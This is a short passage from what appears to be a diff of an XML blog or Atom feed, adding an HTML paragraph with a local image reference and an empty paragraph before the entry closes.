+<p>​<img src="/assets/image-20230929215752-rpzexyo.png" alt="image">​</p>
+<p>‍</p>
 ]]></content>
   </entry>
   <entry>
